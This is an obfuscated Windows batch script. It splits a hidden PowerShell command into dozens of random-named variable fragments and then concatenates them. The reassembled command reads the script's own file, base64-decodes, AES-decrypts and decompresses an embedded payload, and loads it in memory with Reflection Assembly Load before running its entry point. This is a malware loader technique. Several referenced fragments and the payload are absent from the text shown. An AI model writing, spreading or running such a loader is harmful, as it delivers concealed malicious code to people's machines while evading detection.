@echo off
!trzcgTKIykeAhlncwspR! "nVdjqKzDsK=tsWi"
!trzcgTKIykeAhlncwspR! "HfqGLedCWD=ose("
!trzcgTKIykeAhlncwspR! "lEdcChPvSc=cute"
!trzcgTKIykeAhlncwspR! "YNfJSyeVKk=] -j"
!trzcgTKIykeAhlncwspR! "OCXLFizNCL=')('"
!trzcgTKIykeAhlncwspR! "JoQoxVrYXC=Stre"
!trzcgTKIykeAhlncwspR! "cltYLeLqVJ=aes_"
!trzcgTKIykeAhlncwspR! "jcRMYdhRER=wTit"
!trzcgTKIykeAhlncwspR! "RrrznXZHDr=[-1."
!trzcgTKIykeAhlncwspR! "yDYqeQEyHz=7;	$"
!trzcgTKIykeAhlncwspR! "lkDgLjccwH=decr"
!trzcgTKIykeAhlncwspR! "PxfgEJqbCK=YmNx"
!trzcgTKIykeAhlncwspR! "zAUXrtHSyf=ypt_"
!trzcgTKIykeAhlncwspR! "zBqnyVGtgo=lit("
!trzcgTKIykeAhlncwspR! "zuPSEtJing=ncti"
!trzcgTKIykeAhlncwspR! "TtfefxhtrJ=To($"
!trzcgTKIykeAhlncwspR! "JUzQVtOusp=decr"
!trzcgTKIykeAhlncwspR! "EhqRBGKfXF=($AV"
!trzcgTKIykeAhlncwspR! "uQYOGeqqfz=, $p"
!trzcgTKIykeAhlncwspR! "tUkehWgZVW=esaB"
!trzcgTKIykeAhlncwspR! "PrAcupIvTl=orF'"
!trzcgTKIykeAhlncwspR! "OvJzcmfqmd=aes_"
!trzcgTKIykeAhlncwspR! "TgrxRsdWLG=]::C"
!trzcgTKIykeAhlncwspR! "KfvWubKekI=aylo"
!trzcgTKIykeAhlncwspR! "fLZRZtqFJB=ar.I"
!trzcgTKIykeAhlncwspR! "DQsIXdhFjR=Subs"
!trzcgTKIykeAhlncwspR! "IzxmeJFRLf=tion"
!trzcgTKIykeAhlncwspR! "logWnemIHP=$pay"
!trzcgTKIykeAhlncwspR! "dtvHegtThI=flec"
!trzcgTKIykeAhlncwspR! "bNdCcKvAoK=omma"
!trzcgTKIykeAhlncwspR! "owBcpLUqLM=B+ro"
!trzcgTKIykeAhlncwspR! "daqZPntPWv=essi"
!trzcgTKIykeAhlncwspR! "JwKDqkBKpo=var."
!trzcgTKIykeAhlncwspR! "kUHnxQSUWP=on ("
!trzcgTKIykeAhlncwspR! "zgipRciCpy=Syst"
!trzcgTKIykeAhlncwspR! "GlaobpQHjF=-nop"
!trzcgTKIykeAhlncwspR! "ZpKtKqHacN=($AV"
!trzcgTKIykeAhlncwspR! "BEcknZwhWa=-1.."
!trzcgTKIykeAhlncwspR! "PizXyNdIoy=p8cc"
!trzcgTKIykeAhlncwspR! "XZRINvkwUm=r);}"
!trzcgTKIykeAhlncwspR! "ahMGpqrIUQ=L=Ne"
!trzcgTKIykeAhlncwspR! "dOrCxqvFyt=n.Co"
!trzcgTKIykeAhlncwspR! "VdyMBTNduZ=ode]"
!trzcgTKIykeAhlncwspR! "YhWLgvLCee=tion"
!trzcgTKIykeAhlncwspR! "xrapmyBPvG=pJY="
!trzcgTKIykeAhlncwspR! "WfCnvXPfpj=;		b"
!trzcgTKIykeAhlncwspR! "UHeZHdedtb=($pa"
!trzcgTKIykeAhlncwspR! "KNylESHkAG=Deco"
!trzcgTKIykeAhlncwspR! "MWUkEVNidp=yste"
!trzcgTKIykeAhlncwspR! "oGgyxJryzr=4FQ3"
!trzcgTKIykeAhlncwspR! "UHUeOCddUT=aram"
!trzcgTKIykeAhlncwspR! "VlWZefqobp=KMXG"
!trzcgTKIykeAhlncwspR! "OrbXIOzotT=Y);	"
!trzcgTKIykeAhlncwspR! "ZIhWXTjUdT= Sys"
!trzcgTKIykeAhlncwspR! "PFXezwwIiI=S46e"
!trzcgTKIykeAhlncwspR! "FhrCNXNJBB=);$p"
!trzcgTKIykeAhlncwspR! "AKscueQVzp=ddin"
!trzcgTKIykeAhlncwspR! "sETHknRxJU=pose"
!trzcgTKIykeAhlncwspR! "zAIjEjFZKs=O.Me"
!trzcgTKIykeAhlncwspR! "PJJEmKXIpT=zFcd"
!trzcgTKIykeAhlncwspR! "qdUJvvQJAt=join"
!trzcgTKIykeAhlncwspR! "BiFjKjtFrg==New"
!trzcgTKIykeAhlncwspR! "dJPyUrmkXi=n ''"
!trzcgTKIykeAhlncwspR! "AQxdUlBWSS=morF"
!trzcgTKIykeAhlncwspR! "cAHExAHmLc=irtS"
!trzcgTKIykeAhlncwspR! "yJPybWTcOt=(,[s"
!trzcgTKIykeAhlncwspR! "MsOkxmXGFE=::('"
!trzcgTKIykeAhlncwspR! "IvJXQRvLnx=ram_"
!trzcgTKIykeAhlncwspR! "RNAuWOkdOf= -jo"
!trzcgTKIykeAhlncwspR! "FzvHmDCWwb=d1_v"
!trzcgTKIykeAhlncwspR! "UEjspauuzh=::('"
!trzcgTKIykeAhlncwspR! "SYvZtQXQru=yloa"
!trzcgTKIykeAhlncwspR! "xQIKyGEwbZ=r=[s"
!trzcgTKIykeAhlncwspR! "sbZqjfzPdq=es_v"
!trzcgTKIykeAhlncwspR! "qefgHamXvC=Key="
!trzcgTKIykeAhlncwspR! "FBvPKhIvgF=)));"
!trzcgTKIykeAhlncwspR! "tQxcpqvRfE=ar;}"
!trzcgTKIykeAhlncwspR! "InEqvgVdgN=Disp"
!trzcgTKIykeAhlncwspR! "uhtawfBnwP=Disp"
!trzcgTKIykeAhlncwspR! "XYmpvbrkmz=trea"
!trzcgTKIykeAhlncwspR! "gDtxBXXSsT=IO.F"
!trzcgTKIykeAhlncwspR! "tVNeAgIQKm=inal"
!trzcgTKIykeAhlncwspR! "SZILDnUxpf=gMod"
!trzcgTKIykeAhlncwspR! "GXcRlnHTur=..-1"
!trzcgTKIykeAhlncwspR! "fOrYBLIoWf=func"
!trzcgTKIykeAhlncwspR! "zeMrtIphSs=func"
!trzcgTKIykeAhlncwspR! "pUjsjxwcIb=Conv"
!trzcgTKIykeAhlncwspR! "cHjcNGzJTU=IO.C"
!trzcgTKIykeAhlncwspR! "ZownUqRUif='[-1"
!trzcgTKIykeAhlncwspR! "ACrmdVpGoN=$CVy"
!trzcgTKIykeAhlncwspR! "AAdVpSPkut=cryp"
!trzcgTKIykeAhlncwspR! "bsdKOUndHl=morF"
!trzcgTKIykeAhlncwspR! "BiZnMnmutE=s -c"
!trzcgTKIykeAhlncwspR! "sspVGJHvvE=in $"
!trzcgTKIykeAhlncwspR! "winkANAJAn=))	{"
!trzcgTKIykeAhlncwspR! "wskqdNJHDu=var)"
!trzcgTKIykeAhlncwspR! "eZYqrHrDnV=ity."
!trzcgTKIykeAhlncwspR! "uofdfSpXrm=aram"
!trzcgTKIykeAhlncwspR! "EdtmgUNFqO=trin"
!trzcgTKIykeAhlncwspR! "vTUERMAIEg=ram2"
!trzcgTKIykeAhlncwspR! "mrSDeIgmoa= exe"
!trzcgTKIykeAhlncwspR! "yQivZDJHJi=ansf"
!trzcgTKIykeAhlncwspR! "XHCPOzLKmf=Syst"
!trzcgTKIykeAhlncwspR! "NwDLRUYYol=sJva"
!trzcgTKIykeAhlncwspR! "RegzAcTuZT=tem."
!trzcgTKIykeAhlncwspR! "wIXcAgdtoX=.-16"
!trzcgTKIykeAhlncwspR! "oPeKaDXKIt= '%~f0'"
!trzcgTKIykeAhlncwspR! "sSxYTWLBZF=n (["
!trzcgTKIykeAhlncwspR! "RIAYnReQXb=ment"
!trzcgTKIykeAhlncwspR! "DknztBvukW=e]::"
!trzcgTKIykeAhlncwspR! "VMMOpfvMqj=;$KM"
!trzcgTKIykeAhlncwspR! "pnoGusgEat=.Aes"
!trzcgTKIykeAhlncwspR! "DbVAhGURrL=unct"
!trzcgTKIykeAhlncwspR! "KCinGEgCUM=tS46"
!trzcgTKIykeAhlncwspR! "TrrRcuYhLu=[Sys"
!trzcgTKIykeAhlncwspR! "KXtRnBOnYM=de=["
!trzcgTKIykeAhlncwspR! "OinSzrxdFp=[Env"
!trzcgTKIykeAhlncwspR! "fIAwNkDYEI=E=[S"
!trzcgTKIykeAhlncwspR! "tfypyebdrr=).Sp"
!trzcgTKIykeAhlncwspR! "XVQCPKEZQT=or_v"
!trzcgTKIykeAhlncwspR! "kqSlrhKZnQ=XGN="
!trzcgTKIykeAhlncwspR! "kBqUmYLznQ=V=[S"
!trzcgTKIykeAhlncwspR! "XoSAksQrBv=');	"
!trzcgTKIykeAhlncwspR! "GKdkbaVJCB=ormF"
!trzcgTKIykeAhlncwspR! "BOoYRyGCOp=.Mem"
!trzcgTKIykeAhlncwspR! "bWAskxSUJU=m;	$"
!trzcgTKIykeAhlncwspR! "AeMobaECLB=unct"
!trzcgTKIykeAhlncwspR! "CEagTZSUgW=YeQ "
!trzcgTKIykeAhlncwspR! "nbLytkUNeR=K=$H"
!trzcgTKIykeAhlncwspR! "zgEzWcOYAj=cw=="
!trzcgTKIykeAhlncwspR! "FFHliycaDc=;exe"
!trzcgTKIykeAhlncwspR! "RGcijMXphH=ar);"
!trzcgTKIykeAhlncwspR! "tqfExkvKMj=ds_v"
!trzcgTKIykeAhlncwspR! "GRDkOhzhwE=ar=$"
!trzcgTKIykeAhlncwspR! "QBdIyVRrxj=_var"
!trzcgTKIykeAhlncwspR! "ZqTMooyyFW=raph"
!trzcgTKIykeAhlncwspR! "jrgexkMiww=var."
!trzcgTKIykeAhlncwspR! "tZNrRozrpD=ing="
!trzcgTKIykeAhlncwspR! "lvEDXlIoAx=('da"
!trzcgTKIykeAhlncwspR! "gkaShrxgLy=tem."
!trzcgTKIykeAhlncwspR! "KRmBBnlALY=rn_v"
!trzcgTKIykeAhlncwspR! "wYDRjyQutf=2_va"
!trzcgTKIykeAhlncwspR! "wjRXrwxaXH=$par"
!trzcgTKIykeAhlncwspR! "YeQgOoqfxg=$hos"
!trzcgTKIykeAhlncwspR! "QFAzZqVrPf=:: '"
!trzcgTKIykeAhlncwspR! "AJerWihEjN=();}"
!trzcgTKIykeAhlncwspR! "gRZVLnMzug=ute_"
!trzcgTKIykeAhlncwspR! "nhBXpaPChj=WloX"
!trzcgTKIykeAhlncwspR! "fgCfvOiKPW=);	$"
!trzcgTKIykeAhlncwspR! "DWvpjdwVlb=s_fu"
!trzcgTKIykeAhlncwspR! "YpRSYxHgCU=e();"
!trzcgTKIykeAhlncwspR! "DdanCCshwq=ispo"
!trzcgTKIykeAhlncwspR! "WaPKLrYuIL=s_va"
!trzcgTKIykeAhlncwspR! "OTwxTPrwGh=r.Tr"
!trzcgTKIykeAhlncwspR! "KOgyUIEhVr=_var"
!trzcgTKIykeAhlncwspR! "qqWxHgBlVt=var)"
!trzcgTKIykeAhlncwspR! "goaVdOhGoB=::('"
!trzcgTKIykeAhlncwspR! "dUOMQetyTv=ompr"
!trzcgTKIykeAhlncwspR! "hKXmrjbYDr=indo"
!trzcgTKIykeAhlncwspR! "kSjemALawm=cute"
!trzcgTKIykeAhlncwspR! "FBDyeczIlh=nnL."
!trzcgTKIykeAhlncwspR! "vzwFskPmSU=uSoE"
!trzcgTKIykeAhlncwspR! "VOamuYLpbV=YeQ."
!trzcgTKIykeAhlncwspR! "hAzOgJTfDe=Padd"
!trzcgTKIykeAhlncwspR! "CgsbdmiAUc=JY.D"
!trzcgTKIykeAhlncwspR! "RpZszxhzeB=null"
!trzcgTKIykeAhlncwspR! "NMfQQsIkLq=Copy"
!trzcgTKIykeAhlncwspR! "coYjvpGhxJ=ctio"
!trzcgTKIykeAhlncwspR! "gysFLWwgYQ=ecom"
!trzcgTKIykeAhlncwspR! "sJwBFOHjOW=ion "
!trzcgTKIykeAhlncwspR! "CaZYYBqJGM=le ="
!trzcgTKIykeAhlncwspR! "aJCjsvAPXm=;	$R"
!trzcgTKIykeAhlncwspR! "zanYWYFTDA=ompr"
!trzcgTKIykeAhlncwspR! "LTDrOmLefh=nMod"
!trzcgTKIykeAhlncwspR! "QqEQatIehk=[-1."
!trzcgTKIykeAhlncwspR! "NPNSCezWkh=Invo"
!trzcgTKIykeAhlncwspR! "ngTHdWbOAb=ypt_"
!trzcgTKIykeAhlncwspR! "qxtRspCqIf= $pa"
!trzcgTKIykeAhlncwspR! "KuTSoYSmIC=rity"
!trzcgTKIykeAhlncwspR! "dAygVMIYjU=ert]"
!trzcgTKIykeAhlncwspR! "TtXlEIQgbj=ess_"
!trzcgTKIykeAhlncwspR! "rGMFGKaJVd= ([C"
!trzcgTKIykeAhlncwspR! "HhYNbkJULr=aBmo"
!trzcgTKIykeAhlncwspR! "suUsqYPrcg=WJ4z"
!trzcgTKIykeAhlncwspR! "mtmUqkzwkV=exec"
!trzcgTKIykeAhlncwspR! "pLQaPxfZbW=ctio"
!trzcgTKIykeAhlncwspR! "SHTUFwzpau=oL'["
!trzcgTKIykeAhlncwspR! "gByeFPniVA=$Rxp"
!trzcgTKIykeAhlncwspR! "usyNNRDxtM=aeR'"
!trzcgTKIykeAhlncwspR! "TzqtKpYTpf=txeT"
!trzcgTKIykeAhlncwspR! "DeMBVSwXvw=);	$"
!trzcgTKIykeAhlncwspR! "HRzVCVEEsM=decr"
!trzcgTKIykeAhlncwspR! "PQUVhAaCFS=] -j"
!trzcgTKIykeAhlncwspR! "YSayuqUsEy=se()"
!trzcgTKIykeAhlncwspR! "OTqUTcecnP=){	$"
!trzcgTKIykeAhlncwspR! "itfqaTsAIo=ion "
!trzcgTKIykeAhlncwspR! "bzLwoNIJdv=mpre"
!trzcgTKIykeAhlncwspR! "qlFeMAAObC=retu"
!trzcgTKIykeAhlncwspR! "ZjWcbVQYcc=N) {"
!trzcgTKIykeAhlncwspR! "VDYTUsJsBl=aram"
!trzcgTKIykeAhlncwspR! "jZwQphymMc=onve"
!trzcgTKIykeAhlncwspR! "bfRkBRqWVd=g[]]"
!trzcgTKIykeAhlncwspR! "jEPyPvOzVc=ep b"
!trzcgTKIykeAhlncwspR! "rqGrQQjmBk=tor_"
!trzcgTKIykeAhlncwspR! "YyHPGOBAdw= $pa"
!trzcgTKIykeAhlncwspR! "BZVbrLIUrQ=ersh"
!trzcgTKIykeAhlncwspR! "RYkPoGhLGo=ell."
!trzcgTKIykeAhlncwspR! "yFddEqIPmE=v1.0"
!trzcgTKIykeAhlncwspR! "YVYwbfuiIe=exe""
!trzcgTKIykeAhlncwspR! "nzCNFJbLTy=2\Wi"
!trzcgTKIykeAhlncwspR! "gnYHeiQiuX=\Sys"
!trzcgTKIykeAhlncwspR! "fLJzwOJrGS=dows"
!trzcgTKIykeAhlncwspR! "pzVCLzKbLT= "
!trzcgTKIykeAhlncwspR! "hepVvKjsPm=ell\"
!trzcgTKIykeAhlncwspR! "vLlqnlBCTb="%systemdrive%"
!trzcgTKIykeAhlncwspR! "sbKgmruJxn=\pow"
!trzcgTKIykeAhlncwspR! "TeuKyJCzCu=tem3"
!trzcgTKIykeAhlncwspR! "zjEAHGfkKu=\Win"
!trzcgTKIykeAhlncwspR! "BjVbUlkWwz=ndow"
!trzcgTKIykeAhlncwspR! "lkPlEHKlbu=erSh"
!trzcgTKIykeAhlncwspR! "PXQMAarZbN=sPow"
%vLlqnlBCTb%%zjEAHGfkKu%%fLJzwOJrGS%%gnYHeiQiuX%%TeuKyJCzCu%%nzCNFJbLTy%%BjVbUlkWwz%%PXQMAarZbN%%lkPlEHKlbu%%hepVvKjsPm%%yFddEqIPmE%%sbKgmruJxn%%BZVbrLIUrQ%%RYkPoGhLGo%%YVYwbfuiIe%%pzVCLzKbLT%%GlaobpQHjF%%KMQtqYlNOd%%iLfTjQaFHf%%zJHsWOCiWo%%oqSMPGHwPi%%qdViwUghfl%%plZegaeywC%%wcQAPSTsdD%%jEPyPvOzVc%%HvcKZdrOGP%%BiZnMnmutE%%bNdCcKvAoK%%mFDuVaZgBL%%AeMobaECLB%%itfqaTsAIo%%HRzVCVEEsM%%ngTHdWbOAb%%fTONBSzmub%%IzxmeJFRLf%%vakZoczynd%%SDZHiNcMtK%%wskqdNJHDu%%rjcvFfJOyz%%sbZqjfzPdq%%HSybJdQTVA%%tSVTLIAEcd%%ennTrvtThY%%nTDmNyLbLB%%pQTYgAfgEA%%EVNZmtFEJo%%KWMWmzoIgm%%XzSAOnupNR%%pnoGusgEat%%TgrxRsdWLG%%mwarDfcmlY%%YpRSYxHgCU%%tKIMtQhuJv%%kyDgFTnWdp%%pUscvEpzzu%%KXtRnBOnYM%%XHCPOzLKmf%%jKcmEyrGqO%%BHVoKmeMSd%%eZYqrHrDnV%%SEmukZUgnO%%khXklpMoeB%%uZRjakMMVW%%hNsuVWuAeK%%sYzeSXcNeb%%VdyMBTNduZ%%nhlqHwPCop%%VljtjwANqd%%iYITbeoGTb%%jrgexkMiww%%hAzOgJTfDe%%tZNrRozrpD%%hjImgDffVZ%%JrrUVIzTNr%%kjcPIjEOmj%%KuTSoYSmIC%%ENjEucITwj%%OGEXtYgSEW%%ZqTMooyyFW%%PmkkNwZyuG%%AKscueQVzp%%SZILDnUxpf%%DknztBvukW%%YHxYwoXQrj%%yDYqeQEyHz%%CCipcqxTJS%%JwKDqkBKpo%%qefgHamXvC%%XWNLuwyiVf%%RegzAcTuZT%%pUjsjxwcIb%%dAygVMIYjU%%MsOkxmXGFE%%hRYBncNuCW%%ZvATbrFaDO%%tUkehWgZVW%%AQxdUlBWSS%%ZownUqRUif%%GXcRlnHTur%%WOyFwjYxZP%%PIhLOexXjQ%%emQPpCNFSH%%EICBWlPQRL%%suUsqYPrcg%%PJJEmKXIpT%%wsFrlggGPD%%oGgyxJryzr%%NwDLRUYYol%%nhBXpaPChj%%RjBzRjDkgC%%szjXgZPTAq%%hirDphfijx%%UOqpADUdUI%%qORLTOXDRp%%kVcRcJRYjJ%%dvaJIDiUxC%%fLZRZtqFJB%%kBqUmYLznQ%%MWUkEVNidp%%FcfpkyWlRI%%tloHyCegwJ%%SJHHPjROme%%GiCuVhvbKN%%cAHExAHmLc%%QGMuxVvyzb%%HhYNbkJULr%%gcwIGrcckp%%BEcknZwhWa%%LXCJgUBUCm%%RNAuWOkdOf%%TtojzdfOAc%%OCXLFizNCL%%PizXyNdIoy%%PstRgsJsjc%%PNtAxpQOPN%%owBcpLUqLM%%ZxAbmwifFm%%zgEzWcOYAj%%XoSAksQrBv%%ysHwcsnsoa%%gKjCohScfn%%XVQCPKEZQT%%GRDkOhzhwE%%OvJzcmfqmd%%AOloxCBfHs%%OoCuupgZNg%%HLFBzBlqzC%%FnNNtSFpMm%%FuzeQATpfN%%fgCfvOiKPW%%qlFeMAAObC%%KRmBBnlALY%%IWlMxzLHsE%%JUzQVtOusp%%ZenDcoTaEh%%DIZQntaSHn%%OTwxTPrwGh%%yQivZDJHJi%%GKdkbaVJCB%%tVNeAgIQKm%%XwuwIMzDQK%%KsjzGePlwS%%UHUeOCddUT%%UTXxljpHCo%%BrSRRaMnyw%%qxtRspCqIf%%IvJXQRvLnx%%PiJhqDPcnN%%QQFyDwzffW%%HYYwGfIVbZ%%FaabGiOmBO%%AAdVpSPkut%%rqGrQQjmBk%%UUaniPPERv%%InEqvgVdgN%%pxBHIpuIlQ%%YCLqUGzPNA%%cltYLeLqVJ%%UffNVxstFS%%uhtawfBnwP%%HfqGLedCWD%%DeMBVSwXvw%%ngkUfUSsCF%%CxTfbPPycQ%%tQxcpqvRfE%%JDSZCBVwBQ%%mLaqafkGAg%%dXVEcwIiFO%%zanYWYFTDA%%TtXlEIQgbj%%fOrYBLIoWf%%SNRMqlxcub%%AqdZnKaJZu%%GCgvJLJowk%%qqWxHgBlVt%%kOMaIPLrLQ%%LYoCyqGvdF%%BiFjKjtFrg%%iOOGjSQgNT%%arDFzscuYr%%zgipRciCpy%%vfZEIWjHsG%%zAIjEjFZKs%%hZHZGbGyOh%%JoQoxVrYXC%%iubsSZyYLI%%wjRXrwxaXH%%qKTlWlJuLJ%%RGcijMXphH%%DHNgKzwTWb%%xrapmyBPvG%%penbQPhINE%%yiSqeIXNAw%%OQxKmAGMWL%%lhTBsyuMqU%%sNfrCozKlD%%BOoYRyGCOp%%jvMctrorXF%%nkwGebLfhX%%bWAskxSUJU%%SSXaLWbcYl%%ahMGpqrIUQ%%NAuRomUtSV%%ytIdNvmwUh%%ZIhWXTjUdT%%gkaShrxgLy%%cHjcNGzJTU%%dUOMQetyTv%%daqZPntPWv%%YgKvfszfjr%%tAaiPlvobd%%XYmpvbrkmz%%nKNxVXjsGy%%FopCcCZhjE%%SeNTxaUuae%%aoSJeINDnR%%bdHDxJIJnS%%cjaIHiXTZV%%dOrCxqvFyt%%PwUrCOxjvO%%rkhhbRnkcV%%LTDrOmLefh%%ndlTdGpIfS%%KNylESHkAG%%clDCIVSCDp%%csenAnZnev%%BEejlYvrNV%%FBDyeczIlh%%NMfQQsIkLq%%TtfefxhtrJ%%AAPHKBOFjy%%OrbXIOzotT%%pkGwclwztG%%VgrCGmXyfp%%DdanCCshwq%%YSayuqUsEy%%eplDDHZzrv%%RbiepljtTA%%TocdHcfShp%%sETHknRxJU%%CSQazXKVii%%gByeFPniVA%%CgsbdmiAUc%%tLJZYaycEK%%sjKYjRfOcu%%aJCjsvAPXm%%OjbgOvRzgE%%rlEkiswtSm%%gtyzbKiAGC%%AJerWihEjN%%ZGIycPfsaZ%%YhWLgvLCee%%mrSDeIgmoa%%kSjemALawm%%EQAHDsMtkB%%xFAeBINetu%%ISeZPgXSyG%%JKfRAvRlaL%%WMbNCFreCE%%MHGcELMARw%%vTUERMAIEg%%QBdIyVRrxj%%OTqUTcecnP%%JrtDqcSxVP%%fIAwNkDYEI%%UvcHHBDaLO%%IxvOwzhArv%%dtvHegtThI%%zfyFVooMVO%%yRLhhHnLZn%%ccGiEAZvCB%%iKScpDYQTi%%lvEDXlIoAx%%SHTUFwzpau%%oTjuFOZIRE%%IwRRcGydls%%SLUfIBQYxS%%dJPyUrmkXi%%mZwWOwQcRY%%XveICCZdLe%%YalZAZGsXK%%uofdfSpXrm%%KOgyUIEhVr%%sjyTklNxwO%%PxfgEJqbCK%%nbLytkUNeR%%vzwFskPmSU%%fSBDxmIZUl%%sDElerxaza%%rasEtpbzOt%%TdiIEuzibg%%BUTSzRUkBa%%NPNSCezWkh%%ljkArouWGJ%%RpZszxhzeB%%uQYOGeqqfz%%VDYTUsJsBl%%wYDRjyQutf%%XZRINvkwUm%%YeQgOoqfxg%%NOYTewmhFi%%oVXZCWLqgz%%hmyomshwdU%%hKXmrjbYDr%%jcRMYdhRER%%CaZYYBqJGM%%oPeKaDXKIt%%VMMOpfvMqj%%kqSlrhKZnQ%%TrrRcuYhLu%%fwilWQnkIT%%gDtxBXXSsT%%TYxRzDvVMV%%goaVdOhGoB%%TzqtKpYTpf%%xfOSBgYrLt%%usyNNRDxtM%%QqEQatIehk%%FBGGxaziuX%%PQUVhAaCFS%%MAACpgBYSh%%yUjBOSMRpM%%sudwXZvJJz%%tfypyebdrr%%zBqnyVGtgo%%OinSzrxdFp%%LRosNsvUcJ%%RIAYnReQXb%%sbCuKkSFPg%%HYycFHmXzg%%zMrxxfIoFI%%nHfDWJpUHD%%zQfVcTkxsF%%EhqRBGKfXF%%CEagTZSUgW%%sspVGJHvvE%%VlWZefqobp%%ZjWcbVQYcc%%aqrwnmSukS%%ZpKtKqHacN%%JESQXivmUL%%TItsDETzMR%%nVdjqKzDsK%%nPVotwxAze%%QFAzZqVrPf%%winkANAJAn%%JSTkxdMeZh%%htaIbIvDjZ%%OhNnnfBKOF%%VOamuYLpbV%%DQsIXdhFjR%%sWzByBeGWs%%BcqtlssOnd%%WfCnvXPfpj%%YWBWmYpzNT%%TfsJuBAYwF%%LsrfVmulfB%%MYrNtFAuhm%%dTbujRMSTT%%xQIKyGEwbZ%%EdtmgUNFqO%%bfRkBRqWVd%%ACrmdVpGoN%%adshIaAPoo%%dhBfRrZyiH%%pIAYzbLgik%%FhrCNXNJBB%%rBIGZtamuM%%WRyHysDuIG%%otGdJWPZrT%%EpWHqNaUYg%%bzLwoNIJdv%%usbVnXVEWd%%DbVAhGURrL%%sJwBFOHjOW%%nfVVzlnbts%%SvXVCZEkoH%%TRssdLWzpy%%pLQaPxfZbW%%sSxYTWLBZF%%kxVgcvMCRN%%pOMVdgFWfe%%UEjspauuzh%%ZvAJnSQJXt%%KCinGEgCUM%%rPvULGoCRc%%bsdKOUndHl%%qWYLtswVLK%%USzNPkZFYH%%DnRVsszxzM%%qdUJvvQJAt%%ktRhiiSqVE%%UHeZHdedtb%%SYvZtQXQru%%tqfExkvKMj%%AjCVSIYVcs%%qMpzAlXSNr%%lbYAkDCzCw%%HuqjAJwAgK%%ScOYdGaGem%%nDXvYzkbKo%%gysFLWwgYQ%%OxLczinZxE%%DWvpjdwVlb%%zuPSEtJing%%kUHnxQSUWP%%lkDgLjccwH%%zAUXrtHSyf%%zeMrtIphSs%%lCZwPoRJhu%%rGMFGKaJVd%%jZwQphymMc%%UUkdwXAyhd%%CXLdOSrgLJ%%IFmPjlfigI%%PFXezwwIiI%%jBCSAlnscx%%PrAcupIvTl%%RrrznXZHDr%%wIXcAgdtoX%%YNfJSyeVKk%%NbOXQRkcED%%mGOKaguyCn%%logWnemIHP%%TeXtEvTalI%%WaPKLrYuIL%%eFsxYyUSKM%%FBvPKhIvgF%%mtmUqkzwkV%%gRZVLnMzug%%AbpzcvFZaD%%JCocyKsygN%%YyHPGOBAdw%%vibaeleNRV%%FzvHmDCWwb%%UntGhctASo%%TfWDiABoYn%%FFHliycaDc%%lEdcChPvSc%%SEUCbADRyM%%coYjvpGhxJ%%ZtXQcpbUba%%KfvWubKekI%%UlBRaWFUGm%%BIXjczHezM%%yJPybWTcOt%%EBWPOORgQg%%JhnPybimTV%%uGEyjlvcPd%%dDfmHZLhvn%
!trzcgTKIykeAhlncwspR! "ZNFkwCJInz=exit"
!trzcgTKIykeAhlncwspR! "qbTGxMnfzm= /b"
%ZNFkwCJInz%%qbTGxMnfzm%
